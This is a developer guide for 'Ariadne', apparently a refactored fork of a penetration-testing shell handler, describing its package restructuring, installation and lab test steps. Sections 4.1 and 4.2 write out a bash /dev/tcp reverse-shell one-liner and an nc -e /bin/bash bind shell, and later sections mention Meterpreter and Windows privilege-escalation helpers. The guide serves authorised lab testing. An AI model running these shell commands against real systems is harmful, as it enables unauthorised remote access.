# GUIDE.md

This fork (Ariadne) restructures the original single-file `penelope.py`
(~8,000 lines) into a proper Python package (`ariadne/`, 15 modules under
8,300 total lines), removes all emoji/decorative-glyph usage from the code
and README, replaces sequential numeric session IDs with randomly generated
adjective-noun codenames (e.g. `shadow-jackal`), and packages the project
for system-wide installation via `uv`.

Everything below has been verified **statically only** — module compiles,
package imports, singleton wiring, and non-interactive CLI flags
(`--version`, `--help`, `--interfaces`, `--check-urls`, `--mcp`). No live
reverse/bind shell, PTY upgrade, or exploit module was executed end-to-end
against a real target as part of this work. Use this guide to do that
testing yourself in your own lab.

## 1. Install

```bash
# from the root of this fork
uv tool install .

# or, for development (editable install, picks up source edits live)
uv tool install --editable .

ariadne --version
ariadne --help
```

To uninstall:

```bash
uv tool uninstall ariadne-shell-handler
```

If you don't want a system-wide install, a plain venv works too:

```bash
uv venv
uv pip install -e .
uv run ariadne --help
```

## 2. What changed, structurally

| Area | Before | After |
|---|---|---|
| Layout | one `penelope.py` file | `ariadne/` package, 15 modules (`compat`, `display`, `log`, `cli_input`, `options`, `payload_data`, `network`, `messenger`, `core`, `utils`, `modules`, `fileserver`, `engine`, `mcp_server`, `__init__`) |
| Session IDs | sequential integers (`1`, `2`, `3`, ...) | random `adjective-noun` codenames (`shadow-jackal`, `swift-falcon`, ...), collision-checked against live sessions |
| Emojis/dingbats | scattered throughout code and README | fully removed; a few genuinely structural glyphs (box-drawing lines, the FAQ's `►` bullets, shields.io badge images) were deliberately left alone since they aren't decorative emoji |
| Packaging | `setuptools`, `py-modules = ["ariadne"]`, pip/pipx install | `setuptools` with `packages = ["ariadne"]`, installable system-wide with `uv tool install .` |

The module split uses a "singleton injection" pattern to avoid rewriting
thousands of internal references: `core`, `menu`, `options`, `logger`,
`input`, and a handful of other objects were bare module-level globals in
the original file, created once near the bottom and looked up at call time
by code defined earlier in the same file. `ariadne/__init__.py` now
creates those same singletons and explicitly assigns them as attributes
onto every submodule that references them as a bare global (see the
`# core: injected by...` comments at the top of each file). This is
mechanically equivalent to the original behavior — same objects, same
call-time lookup — just made explicit across module boundaries instead of
implicit within one file.

Two call sites that would otherwise create real circular imports were
restructured instead of papered over:
- `Messenger` (session wire-protocol framing) was split out of `engine.py`
  into its own tiny `messenger.py`, because `options.py` validates
  `--network-buffer-size` against `Messenger`'s frame-size constants, and
  `options.py` is created before `engine.py` in the import order.
- `network.py`'s `Connect()` (bind-shell connection) does a deferred,
  function-local `from .engine import Session` instead of a top-level
  import, since `engine.py` already imports several things from
  `network.py` at its own top level.

## 3. Quick smoke test (safe, no network)

```bash
ariadne --version
ariadne --help
ariadne --interfaces
ariadne --check-urls      # exercises the hardcoded-URL health checker
```

All four should run and exit cleanly with no traceback.

## 4. Things you should test yourself in a lab

These are the areas most worth exercising end-to-end, roughly in order of
how much the refactor touched them:

### 4.1 Reverse shell lifecycle + random session naming
```bash
ariadne -p 4444
# from a target/VM:
bash -c 'bash -i >& /dev/tcp/<your-ip>/4444 0>&1'
```
Confirm: the new session gets a random codename (not a number) in the
session list, PTY upgrade still happens automatically, and the codename is
stable for that session for its whole lifetime (reattach, background,
`sessions` listing, logs).

### 4.2 Bind shell
```bash
# on target:
nc -lvnp 5555 -e /bin/bash
# on attacker:
ariadne -c <target-ip>
```
This exercises `network.py`'s `Connect()` and its deferred `Session`
import — worth specifically confirming this path still spawns a session
correctly, since it's the one place a real circular import was worked
around.

### 4.3 PTY upgrade across the module boundary
The core read/write event loop (`Core.loop`), the PTY upgrade logic, and
the `Session` class now live in different files (`core.py` vs `engine.py`)
than they used to. Exercise:
- interactive shells (vim, less, top) inside an upgraded PTY session
- window resize (`SIGWINCH`) propagating correctly to the remote PTY
- Ctrl-C / Ctrl-Z behavior while attached

### 4.4 Meterpreter module
```bash
# inside the menu, on an attached session:
run meterpreter
```
Requires `msfvenom`/Metasploit locally. Worth testing because this module
(`modules.py`) now imports `Open`/`paint` from `display.py` across a module
boundary that didn't exist before.

### 4.5 MCP server
```bash
ariadne --mcp --mcp-port 8765
```
It should print a `claude mcp add --transport http ...` registration
command with a bearer token. Register it with an MCP client and confirm
the session-related tools work with the new string-based codenames
(the MCP JSON schema was updated from `"type": "integer"` to
`"type": "string"` for session IDs — worth double-checking against a real
client, not just the schema).

### 4.6 Windows targets
Nothing Windows-specific was restructured beyond module boundaries, but
the Windows code paths (`upload_potato`, `uac`, PowerShell payload
templates in `utils.py`, etc.) weren't live-tested here. Worth a pass
against an actual Windows target or VM.

### 4.7 File server & file transfer
```bash
ariadne -s /path/to/dir
```
and, from an attached session, `upload`/`download` commands — exercises
`fileserver.py` and the transfer helpers in `utils.py`.

### 4.8 `--no-disk` ephemeral mode
```bash
ariadne --no-disk
```
Confirm state goes to `/dev/shm` (or a wiped-on-exit temp dir if `/dev/shm`
isn't available) rather than `~/.ariadne`.

## 5. If something breaks

Most likely failure mode from this kind of refactor is a `NameError` for a
bare-global name that was missed during the module split (the same class of
bug this fork hit and fixed several times for names like `input`,
`restore_tty`, `AGENT`, `custom_excepthook` — see the `# X: injected by...`
comments at the top of each module for the full list of what's expected to
be injected). If you hit one:

1. Note which module and which name.
2. Check whether that name is created in `ariadne/__init__.py` and
   injected into the right modules in the injection block near the bottom
   of that file.
3. Add the missing `module.name = value` line next to the existing ones.

This is a mechanical, low-risk fix — it never requires touching the logic
itself, only the wiring.
